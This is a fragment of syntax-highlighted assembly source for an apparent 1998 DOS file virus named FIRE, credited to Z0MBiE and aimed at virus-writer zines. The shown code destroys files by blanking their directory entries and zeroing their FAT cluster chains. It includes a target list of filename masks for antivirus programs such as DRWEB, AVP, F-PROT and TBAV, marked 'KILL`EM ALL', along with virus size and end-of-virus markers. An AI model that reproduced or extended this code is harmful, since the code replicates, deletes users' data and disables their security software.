</span><span class="sc5">__fuck_it</span><span class="sc4">:</span><span class="sc0">              </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc5">CACHE_MODIFIED</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">1</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_cluster</span><span class="sc0">

                        </span><span class="sc1">; kill namme</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">si</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc2">32</span><span class="sc0">
</span><span class="sc5">__1</span><span class="sc4">:</span><span class="sc0">                    </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">di</span><span class="sc4">],</span><span class="sc0"> </span><span class="sc2">0</span><span class="sc0">
                        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">di</span><span class="sc0">
                        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">__1</span><span class="sc0">
                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">gs</span><span class="sc4">:[</span><span class="sc8">si</span><span class="sc4">]</span><span class="sc5">.direntry_name</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">char_DELETED</span><span class="sc0">

                        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">bx</span><span class="sc0">  </span><span class="sc1">; zero-file</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__eof</span><span class="sc0">

                        </span><span class="sc1">; kill cluster links</span><span class="sc0">

</span><span class="sc5">__killnext</span><span class="sc4">:</span><span class="sc0">             </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_cluster_get</span><span class="sc0">

                        </span><span class="sc6">pusha</span><span class="sc0">
                        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">level3_cluster_set</span><span class="sc0">
                        </span><span class="sc6">popa</span><span class="sc0">

                        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc5">EOF</span><span class="sc0">
                        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">__eof</span><span class="sc0">

                        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">bx</span><span class="sc4">,</span><span class="sc0"> </span><span class="sc8">ax</span><span class="sc0">
                        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">__killnext</span><span class="sc0">

</span><span class="sc5">__eof</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc6">popad</span><span class="sc0">

                        </span><span class="sc6">stc</span><span class="sc0">
                        </span><span class="sc6">ret</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc1">; AV-files - KILL`EM ALL !!!</span><span class="sc0">

</span><span class="sc5">fucked</span><span class="sc4">:</span><span class="sc0">                 </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ANTI???????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'DRWEB??????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'WEB?????EXE'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AIDS???????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'AVP????????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'SCAN???????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'ADIN???????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'FPROT??????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'TBAV???????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'VIR????????'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'????????327'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'????????AVC'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'????????WEB'</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'????????MS '</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'????????CPS'</span><span class="sc0">
</span><span class="sc5">fucked_end</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">           </span><span class="sc1">; dont kill your hd, baby...</span><span class="sc0">
</span><span class="sc5">z0mbie_id</span><span class="sc0">               </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'Z0MBiE#ID1234'</span><span class="sc0">
</span><span class="sc5">z0mbie_id_len</span><span class="sc0">           </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc10">$</span><span class="sc4">-</span><span class="sc5">z0mbie_id</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

                        </span><span class="sc1">; never change it, sucker...</span><span class="sc0">

</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'-----------------------------------------------------------------------------'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' [FIRE]   FAT16 Independent Replicative Emulator   Copyright (c) 1998 Z0MBiE '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' Release 1.00[BETA]   *** NOT FOR [RE]PUBLISHING IN VX-ZINES, EXCEPT 29A *** '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">' Thanx to S.S.R. &amp; LordASD              HomePage: http://www.chat.ru/~z0mbie '</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc12">'-----------------------------------------------------------------------------'</span><span class="sc4">,</span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">
</span><span class="sc9">db</span><span class="sc0"> </span><span class="sc2">13</span><span class="sc4">,</span><span class="sc2">10</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">malloc.inc</span><span class="sc0">      </span><span class="sc1">; &lt;- dos memory allocation</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">fatsys.inc</span><span class="sc0">      </span><span class="sc1">; &lt;- file system emulator</span><span class="sc0">

                        </span><span class="sc9">IFDEF</span><span class="sc0">   </span><span class="sc5">DEBUG</span><span class="sc0">   </span><span class="sc1">; &lt;- screen output routines</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">stdio.inc</span><span class="sc0">
                        </span><span class="sc9">ENDIF</span><span class="sc0">

                        </span><span class="sc1">; end of virus (EOV) mark</span><span class="sc0">
                        </span><span class="sc9">org</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc4">+</span><span class="sc5">virsize</span><span class="sc4">-</span><span class="sc2">3</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc12">'EOV'</span><span class="sc0">
</span><span class="sc5">codeend</span><span class="sc4">:</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">datastart</span><span class="sc4">:</span><span class="sc0">
                        </span><span class="sc1">; stack</span><span class="sc0">
                        </span><span class="sc9">even</span><span class="sc0">
                        </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc2">1024</span><span class="sc0"> </span><span class="sc9">dup</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc10">?</span><span class="sc4">)</span><span class="sc0">
</span><span class="sc5">exe_endofstack</span><span class="sc4">:</span><span class="sc0">

                        </span><span class="sc1">; variables</span><span class="sc0">
</span><span class="sc9">include</span><span class="sc0">                 </span><span class="sc5">FATSYS.VAR</span><span class="sc0">

</span><span class="sc5">_rec</span><span class="sc0">                    </span><span class="sc9">dw</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; recurse level</span><span class="sc0">
</span><span class="sc5">CACHE_MODIFIED</span><span class="sc0">          </span><span class="sc9">db</span><span class="sc0">      </span><span class="sc10">?</span><span class="sc0">       </span><span class="sc1">; flag</span><span class="sc0">

                        </span><span class="sc1">; thats all</span><span class="sc0">
</span><span class="sc5">dataend</span><span class="sc4">:</span><span class="sc0">
</span><span class="sc5">virmemory</span><span class="sc0">               </span><span class="sc9">equ</span><span class="sc0">     </span><span class="sc4">(</span><span class="sc5">dataend</span><span class="sc4">-</span><span class="sc5">datastart</span><span class="sc4">+</span><span class="sc2">15</span><span class="sc4">)/</span><span class="sc2">16</span><span class="sc0">

</span><span class="sc1">; ---------------------------------------------------------------------------</span><span class="sc0">

</span><span class="sc5">code</span><span class="sc0">                    </span><span class="sc9">ends</span><span class="sc0">
                        </span><span class="sc9">end</span><span class="sc0">     </span><span class="sc5">start</span><span class="sc0">

</span></div></body>
</html>
